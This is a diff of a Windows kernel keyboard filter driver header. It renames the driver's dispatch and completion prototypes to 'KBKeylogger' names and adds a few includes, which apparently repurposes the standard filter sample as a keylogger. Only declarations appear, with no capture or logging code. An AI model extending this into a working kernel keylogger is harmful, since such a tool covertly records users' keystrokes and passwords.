@@ -19,8 +19,9 @@ Notes:
 
 Revision History:
 
-
+legacy_stdio_definitions.lib
 --*/
+
 
 #ifndef KBFILTER_H
 #define KBFILTER_H
@@ -29,7 +30,8 @@ Revision History:
 #include "kbdmou.h"
 #include <ntddkbd.h>
 #include <ntdd8042.h>
-
+#include <ntdd8042.h>
+#include <stdio.h>
 #define KBFILTER_POOL_TAG (ULONG) 'tlfK'
 #undef ExAllocatePool
 #define ExAllocatePool(type, size) \
@@ -131,33 +133,32 @@ AddDevice(
     IN PDEVICE_OBJECT BusDeviceObject
     );
 
-
-Completion(
-	IN PDEVICE_OBJECT   DeviceObject,
-	IN PIRP             Irp,
-	IN PVOID            Context
+NTSTATUS ReadCompletion(
+	IN PDEVICE_OBJECT DeviceObject,
+	IN PIRP Irp,
+	IN PVOID Context
 );
 
 NTSTATUS
-ReadCompletion(
+KBKeyloggerRead(
 	IN PDEVICE_OBJECT   DeviceObject,
 	IN PIRP             Irp
 );
 
 NTSTATUS
-CreateClose (
+KBKeyloggerCreateClose (
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     );
 
 NTSTATUS
-DispatchPassThrough(
+KBKeyloggerDispatchPassThrough(
         IN PDEVICE_OBJECT DeviceObject,
         IN PIRP Irp
         );
    
 NTSTATUS
-InternIoCtl (
+KBKeyloggerInternIoCtl (
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     );
@@ -169,13 +170,13 @@ IoCtl (
     );
 
 NTSTATUS
-PnP (
+KBKeyloggerPnP (
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     );
 
 NTSTATUS
-Power (
+KBKeyloggerPower (
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     );
